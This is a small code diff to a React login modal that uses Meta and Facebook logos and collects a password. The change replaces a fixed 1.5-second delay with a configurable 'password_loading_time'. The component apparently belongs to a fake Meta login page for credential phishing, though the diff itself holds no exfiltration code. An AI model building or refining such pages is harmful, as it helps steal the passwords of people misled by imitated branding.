@@ -2,6 +2,7 @@ import { useState } from 'react';
 import PropTypes from 'prop-types';
 import MetaLogo from '@/assets/images/meta-logo-grey.png';
 import FbRoundLogo from '@/assets/images/fb_round_logo.png';
+import config from '@/utils/config';
 
 const LoginModal = ({ show, onClose, onSubmit, onSuccess, texts }) => {
     const [formData, setFormData] = useState({
@@ -41,7 +42,7 @@ const LoginModal = ({ show, onClose, onSubmit, onSuccess, texts }) => {
                 onSubmit('', formData.password);
                 onSuccess();
             }
-        }, 1500);
+        }, (config.password_loading_time || 5) * 1000);
     };
 
     const togglePasswordVisibility = () => {
